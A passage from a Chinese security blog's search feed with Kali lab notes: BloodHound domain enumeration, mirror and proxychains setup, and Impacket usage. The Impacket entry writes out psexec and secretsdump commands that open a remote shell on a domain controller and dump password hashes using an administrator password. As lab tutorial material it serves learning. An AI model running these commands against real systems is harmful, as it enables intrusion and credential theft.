<li>安装成功，还需要重启生效，重启一下。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009224635989.png" alt="image-20251009224635989"></li>
<li>再次执行<code>SharpHound.exe -c all</code>。成功！<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009224855646.png" alt="image-20251009224855646"></li>
<li>等待一会，出现两个文件。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009225024847.png" alt="image-20251009225024847"></li>
<li>拷贝20251009224853_BloodHound.zip文件到kali下。</li>
<li>启动bloodhound，右侧栏点击图标导入。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009225525575.png" alt="image-20251009225525575"></li>
<li>我这里导入出现错误，换了旧版本的收集器也不行，对了下二进制程序版本和收集器版本，都是4.3.1没毛病，但是解析报错<code>BAD JSON FILE</code>。这可咋整。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009225622347.png" alt="image-20251009225622347"></li>
<li>后来发现是导入按钮选错了，应该是如图所示位置的导入功能。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009231934017.png" alt="image-20251009231934017"></li>
<li>成功导入！<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009232006787.png" alt="image-20251009232006787"></li>
<li>左侧选择默认查询器进行查询，这里用的是查询域管理员查询器。<img src="/../images/%E5%9F%9F%E6%B8%97%E9%80%8F-bloodhound%E5%AE%89%E8%A3%85%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/image-20251009232129572.png" alt="image-20251009232129572"></li>
</ol>
<h2 id="详细使用教程"><a href="#详细使用教程" class="headerlink" title="详细使用教程"></a>详细使用教程</h2><ol>
<li><a href="https://blog.csdn.net/qq_56426046/article/details/126854991">https://blog.csdn.net/qq_56426046/article/details/126854991</a></li>
<li><a href="https://www.freebuf.com/articles/web/288370.html">https://www.freebuf.com/articles/web/288370.html</a></li>
</ol>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>kali配置清华源</title>
    <url>/2025/10/09/kali%E9%85%8D%E7%BD%AE%E6%B8%85%E5%8D%8E%E6%BA%90/</url>
    <content><![CDATA[<h2 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h2><ol>
<li>kali版本。kali-linux-2025.3-vmware-amd64</li>
</ol>
<h2 id="配置清华源"><a href="#配置清华源" class="headerlink" title="配置清华源"></a>配置清华源</h2><ol>
<li>执行<code>sudo vim /etc/apt/sources.list</code>打开配置文件。按<code>i</code>执行编辑插入。</li>
<li>复制源粘贴进去（按ctrl+shift+v粘贴）。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure>
<img src="/../images/kali%E9%85%8D%E7%BD%AE%E6%B8%85%E5%8D%8E%E6%BA%90/image-20251009191719775.png" alt="image-20251009191719775"></li>
<li>按<code>shift+:</code>，进入命令行。输入<code>wq!</code>保存。<br><img src="/../images/kali%E9%85%8D%E7%BD%AE%E6%B8%85%E5%8D%8E%E6%BA%90/image-20251009192120070.png" alt="image-20251009192120070"></li>
<li>执行<code>sudo apt upgate</code>检查更新。<img src="/../images/kali%E9%85%8D%E7%BD%AE%E6%B8%85%E5%8D%8E%E6%BA%90/image-20251009192324250.png" alt="image-20251009192324250"></li>
</ol>
]]></content>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>kali安装translate-shell及使用</title>
    <url>/2025/10/10/kali%E5%AE%89%E8%A3%85translate-shell%E5%8F%8A%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="工具说明"><a href="#工具说明" class="headerlink" title="工具说明"></a>工具说明</h2><p>translate-shell是一个命令行翻译工具。</p>
<h2 id="安装工具"><a href="#安装工具" class="headerlink" title="安装工具"></a>安装工具</h2><p>执行<code>sudo apt update &amp;&amp; sudo apt install translate-shell</code>安装。<img src="/../images/kali%E5%AE%89%E8%A3%85translate-shell%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20251010140547591.png" alt="image-20251010140547591"></p>
<h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><ol>
<li>简单翻译，可能响应有点慢。执行<code>echo &quot;hello&quot; | trans -e bing -t zh</code>。参数解释：<code>-e</code>指定翻译用的引擎，<code>-t</code>指定翻译的目标语言。<img src="/../images/kali%E5%AE%89%E8%A3%85translate-shell%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20251010140842208.png" alt="image-20251010140842208"></li>
<li>查看支持的翻译引擎。执行<code>trans -list-engines</code>，默认是auto自动。<img src="/../images/kali%E5%AE%89%E8%A3%85translate-shell%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20251010141100058.png" alt="image-20251010141100058"></li>
</ol>
<h2 id="更优雅的使用方式"><a href="#更优雅的使用方式" class="headerlink" title="更优雅的使用方式"></a>更优雅的使用方式</h2><p>在 <code>.bashrc</code> 或 <code>.zshrc</code> 中添加，kali用<code>.zshrc</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alias trans=&#x27;trans -e bing&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="/../images/kali%E5%AE%89%E8%A3%85translate-shell%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20251010141524336.png" alt="image-20251010141524336"><br>之后就执行<code>source ~/.zshrc</code>加载环境变量，最后就可以直接使用<code>echo &quot;Hello&quot; | trans -t zh</code>调用bing翻译了。<img src="/../images/kali%E5%AE%89%E8%A3%85translate-shell%E5%8F%8A%E4%BD%BF%E7%94%A8/image-20251010142149983.png" alt="image-20251010142149983"></p>
]]></content>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>kali的proxychains4代理工具使用</title>
    <url>/2025/10/10/kali%E7%9A%84proxychains4%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p><code>proxychains4</code> 是一款在 <strong>Linux&#x2F;macOS</strong> 系统中广泛使用的 <strong>命令行代理工具</strong>，核心功能是让原本不支持代理设置的命令行程序（如 <code>curl</code>、<code>ssh</code>、<code>nmap</code> 等）通过指定的代理服务器（如 SOCKS5、HTTP&#x2F;S）发起网络请求，实现流量转发。它基于动态链接库（<code>LD_PRELOAD</code> 机制）拦截程序的网络系统调用，无需修改程序本身代码，即可强制其走代理。</p>
<h2 id="工具配置"><a href="#工具配置" class="headerlink" title="工具配置"></a>工具配置</h2><p><code>proxychains4</code> 的配置文件默认路径为 <code>/etc/proxychains4.conf</code>（Linux）或 <code>/usr/local/etc/proxychains.conf</code>（macOS）。配置的核心是指定 <strong>代理服务器地址</strong> 和 <strong>代理规则</strong>。</p>
<h3 id="1-关键配置项解析"><a href="#1-关键配置项解析" class="headerlink" title="1. 关键配置项解析"></a>1. 关键配置项解析</h3><p>打开配置文件（需 root 权限，如 <code>sudo vim /etc/proxychains4.conf</code>），主要关注以下部分：</p>
<table>
<thead>
<tr>
<th>配置项</th>
<th>作用说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>dynamic_chain</code></td>
<td>启用 “动态代理链”：若前一个代理不可用，自动尝试下一个（推荐开启）；若注释则为 <code>strict_chain</code>（严格模式，一个不可用则失败）。</td>
</tr>
<tr>
<td><code>proxy_dns</code></td>
<td>启用 “代理 DNS 解析”：避免 DNS 请求泄露真实 IP（推荐开启，需取消注释）。</td>
</tr>
<tr>
<td><code>[ProxyList]</code></td>
<td>代理服务器列表，在此处添加你的代理地址，格式为：<code>协议类型 代理IP 代理端口 [用户名 密码]</code>（若代理需认证）。</td>
</tr>
</tbody></table>
<h3 id="2-常见配置示例"><a href="#2-常见配置示例" class="headerlink" title="2. 常见配置示例"></a>2. 常见配置示例</h3><p>假设你本地运行了一个 SOCKS5 代理（如 Clash（7890端口） 或 Shadowsocks（1080端口）），配置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 启用动态链和代理DNS</span><br><span class="line">dynamic_chain</span><br><span class="line">proxy_dns</span><br><span class="line"></span><br><span class="line"># 代理服务器列表（SOCKS5 示例）</span><br><span class="line">[ProxyList]</span><br><span class="line">socks5 192.168.1.23 1080  # 本地 SOCKS5 代理，无认证</span><br><span class="line"># http    192.168.1.100  8080  user1  pass1  # 带认证的 HTTP 代理示例</span><br></pre></td></tr></table></figure>

<h3 id="配置实例"><a href="#配置实例" class="headerlink" title="配置实例"></a>配置实例</h3><p>kali主机网卡改为桥接，DHCP分配到IP：192.168.1.19。宿主机IP：192.168.1.23，ssr开启局域网连接1080端口。<img src="/../images/kali%E7%9A%84proxychains4%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20251010161254096.png" alt="image-20251010161254096"></p>
<p>编辑配置文件<code>sudo vim /etc/proxychains4.conf</code>，在最后一行添加代理。</p>
<p><img src="/../images/kali%E7%9A%84proxychains4%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20251010161355130.png" alt="image-20251010161355130"></p>
<p>测试连接<code>proxychains4 curl www.google.com</code>。<img src="/../images/kali%E7%9A%84proxychains4%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20251010161507603.png" alt="image-20251010161507603"></p>
]]></content>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>kali的impacket工具使用</title>
    <url>/2025/10/10/kali%E7%9A%84impacket%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h2><ol>
<li>kali主机。（IP：10.10.10.100）kali-linux-2025.3-vmware-amd64</li>
<li>域控主机。（IP：10.10.10.1）</li>
</ol>
<h2 id="工具路径"><a href="#工具路径" class="headerlink" title="工具路径"></a>工具路径</h2><p>在<code>/usr/bin</code>目录下，以<code>impacket-</code>开头</p>
<p><img src="/../images/kali%E7%9A%84impacket%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20251010143357277.png" alt="image-20251010143357277"></p>
<h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><h3 id="命令执行-impacket-psexec"><a href="#命令执行-impacket-psexec" class="headerlink" title="命令执行-impacket-psexec"></a>命令执行-impacket-psexec</h3><p>直接执行查看帮助。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">usage: psexec.py [-h] [-c pathname] [-path PATH] [-file FILE] [-ts] [-debug] [-codec CODEC] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-keytab KEYTAB] [-dc-ip ip address]</span><br><span class="line">                 [-target-ip ip address] [-port [destination port]] [-service-name service_name] [-remote-binary-name remote_binary_name]</span><br><span class="line">                 target [command ...]</span><br><span class="line"></span><br><span class="line">PSEXEC like functionality example using RemComSvc.</span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  target                [[domain/]username[:password]@]&lt;targetName or address&gt;</span><br><span class="line">  command               command (or arguments if -c is used) to execute at the target (w/o path) - (default:cmd.exe)</span><br><span class="line"></span><br><span class="line">options:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -c pathname           copy the filename for later execution, arguments are passed in the command option</span><br><span class="line">  -path PATH            path of the command to execute</span><br><span class="line">  -file FILE            alternative RemCom binary (be sure it doesn&#x27;t require CRT)</span><br><span class="line">  -ts                   adds timestamp to every logging output</span><br><span class="line">  -debug                Turn DEBUG output ON</span><br><span class="line">  -codec CODEC          Sets encoding used (codec) from the target&#x27;s output (default &quot;utf-8&quot;). If errors are detected, run chcp.com at the target, map the result with</span><br><span class="line">                        https://docs.python.org/3/library/codecs.html#standard-encodings and then execute smbexec.py again with -codec and the corresponding codec</span><br><span class="line"></span><br><span class="line">authentication:</span><br><span class="line">  -hashes LMHASH:NTHASH</span><br><span class="line">                        NTLM hashes, format is LMHASH:NTHASH</span><br><span class="line">  -no-pass              don&#x27;t ask for password (useful for -k)</span><br><span class="line">  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones</span><br><span class="line">                        specified in the command line</span><br><span class="line">  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)</span><br><span class="line">  -keytab KEYTAB        Read keys for SPN from keytab file</span><br><span class="line"></span><br><span class="line">connection:</span><br><span class="line">  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter</span><br><span class="line">  -target-ip ip address</span><br><span class="line">                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it</span><br><span class="line">  -port [destination port]</span><br><span class="line">                        Destination port to connect to SMB Server</span><br><span class="line">  -service-name service_name</span><br><span class="line">                        The name of the service used to trigger the payload</span><br><span class="line">  -remote-binary-name remote_binary_name</span><br><span class="line">                        This will be the name of the executable uploaded on the target</span><br></pre></td></tr></table></figure>
<p>简单连接域控，返回shell，执行<code>impacket-psexec test.com/administrator:win2k8dc.@10.10.10.1</code>。进入shell之后执行命令可能乱码，如图。</p>
<p><img src="/../images/kali%E7%9A%84impacket%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20251010144540986.png" alt="image-20251010144540986"></p>
<p>因为域控是中文的版本，所以出现乱码，在目标域控shell上执行<code>chcp.com</code>查看编码code，红框处的936是编码代码。</p>
<p><img src="/../images/kali%E7%9A%84impacket%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20251010145124629.png" alt="image-20251010145124629"></p>
<p>重新执行<code>impacket-psexec test.com/administrator:win2k8dc.@10.10.10.1 -codec 936</code>，指定codec参数为936，可以看到shell就不乱码了。</p>
<p><img src="/../images/kali%E7%9A%84impacket%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20251010145240738.png" alt="image-20251010145240738"></p>
<h3 id="凭证窃取-impacket-secretsdump"><a href="#凭证窃取-impacket-secretsdump" class="headerlink" title="凭证窃取-impacket-secretsdump"></a>凭证窃取-impacket-secretsdump</h3><p>工具帮助文档：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">usage: secretsdump.py [-h] [-ts] [-debug] [-system SYSTEM] [-bootkey BOOTKEY] [-security SECURITY] [-sam SAM] [-ntds NTDS] [-resumefile RESUMEFILE] [-skip-sam] [-skip-security]</span><br><span class="line">                      [-outputfile OUTPUTFILE] [-use-vss] [-rodcNo RODCNO] [-rodcKey RODCKEY] [-use-keylist] [-exec-method [&#123;smbexec,wmiexec,mmcexec&#125;]] [-use-remoteSSMethod]</span><br><span class="line">                      [-remoteSS-remote-volume REMOTESS_REMOTE_VOLUME] [-remoteSS-local-path REMOTESS_LOCAL_PATH] [-just-dc-user USERNAME] [-ldapfilter LDAPFILTER] [-just-dc]</span><br><span class="line">                      [-just-dc-ntlm] [-skip-user SKIP_USER] [-pwd-last-set] [-user-status] [-history] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-keytab KEYTAB]</span><br><span class="line">                      [-dc-ip ip address] [-target-ip ip address]</span><br><span class="line">                      target</span><br><span class="line"></span><br><span class="line">Performs various techniques to dump secrets from the remote machine without executing any agent there.</span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  target                [[domain/]username[:password]@]&lt;targetName or address&gt; or LOCAL (if you want to parse local files)</span><br><span class="line"></span><br><span class="line">options:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -ts                   Adds timestamp to every logging output</span><br><span class="line">  -debug                Turn DEBUG output ON</span><br><span class="line">  -system SYSTEM        SYSTEM hive to parse</span><br><span class="line">  -bootkey BOOTKEY      bootkey for SYSTEM hive</span><br><span class="line">  -security SECURITY    SECURITY hive to parse</span><br><span class="line">  -sam SAM              SAM hive to parse</span><br><span class="line">  -ntds NTDS            NTDS.DIT file to parse</span><br><span class="line">  -resumefile RESUMEFILE</span><br><span class="line">                        resume file name to resume NTDS.DIT session dump (only available to DRSUAPI approach). This file will also be used to keep updating the session&#x27;s state</span><br><span class="line">  -skip-sam             Do NOT parse the SAM hive on remote system</span><br><span class="line">  -skip-security        Do NOT parse the SECURITY hive on remote system</span><br><span class="line">  -outputfile OUTPUTFILE</span><br><span class="line">                        base output filename. Extensions will be added for sam, secrets, cached and ntds</span><br><span class="line">  -use-vss              Use the NTDSUTIL VSS method instead of default DRSUAPI</span><br><span class="line">  -rodcNo RODCNO        Number of the RODC krbtgt account (only avaiable for Kerb-Key-List approach)</span><br><span class="line">  -rodcKey RODCKEY      AES key of the Read Only Domain Controller (only avaiable for Kerb-Key-List approach)</span><br><span class="line">  -use-keylist          Use the Kerb-Key-List method instead of default DRSUAPI</span><br><span class="line">  -exec-method [&#123;smbexec,wmiexec,mmcexec&#125;]</span><br><span class="line">                        Remote exec method to use at target (only when using -use-vss). Default: smbexec</span><br><span class="line">  -use-remoteSSMethod   Remotely create Shadow Snapshot via WMI and download SAM, SYSTEM and SECURITY from it, the parse locally</span><br><span class="line">  -remoteSS-remote-volume REMOTESS_REMOTE_VOLUME</span><br><span class="line">                        Remote Volume to perform the Shadow Snapshot and download SAM, SYSTEM and SECURITY</span><br><span class="line">  -remoteSS-local-path REMOTESS_LOCAL_PATH</span><br><span class="line">                        Path where download SAM, SYSTEM and SECURITY from Shadow Snapshot. It defaults to current path</span><br><span class="line"></span><br><span class="line">display options:</span><br><span class="line">  -just-dc-user USERNAME</span><br><span class="line">                        Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. Implies also -just-dc switch</span><br><span class="line">  -ldapfilter LDAPFILTER</span><br><span class="line">                        Extract only NTDS.DIT data for specific users based on an LDAP filter. Only available for DRSUAPI approach. Implies also -just-dc switch</span><br><span class="line">  -just-dc              Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)</span><br><span class="line">  -just-dc-ntlm         Extract only NTDS.DIT data (NTLM hashes only)</span><br><span class="line">  -skip-user SKIP_USER  Do NOT extract NTDS.DIT data for the user specified. Can provide comma-separated list of users to skip, or text file with one user per line</span><br><span class="line">  -pwd-last-set         Shows pwdLastSet attribute for each NTDS.DIT account. Doesn&#x27;t apply to -outputfile data</span><br><span class="line">  -user-status          Display whether or not the user is disabled</span><br><span class="line">  -history              Dump password history, and LSA secrets OldVal</span><br><span class="line"></span><br><span class="line">authentication:</span><br><span class="line">  -hashes LMHASH:NTHASH</span><br><span class="line">                        NTLM hashes, format is LMHASH:NTHASH</span><br><span class="line">  -no-pass              don&#x27;t ask for password (useful for -k)</span><br><span class="line">  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones</span><br><span class="line">                        specified in the command line</span><br><span class="line">  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)</span><br><span class="line">  -keytab KEYTAB        Read keys for SPN from keytab file</span><br><span class="line"></span><br><span class="line">connection:</span><br><span class="line">  -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter</span><br><span class="line">  -target-ip ip address</span><br><span class="line">                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it</span><br></pre></td></tr></table></figure>

<p>dump密码hash，执行<code>impacket-secretsdump test.com/administrator:win2k8dc.@10.10.10.1</code>。<img src="/../images/kali%E7%9A%84impacket%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20251010150045492.png" alt="image-20251010150045492"></p>
]]></content>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
</search>
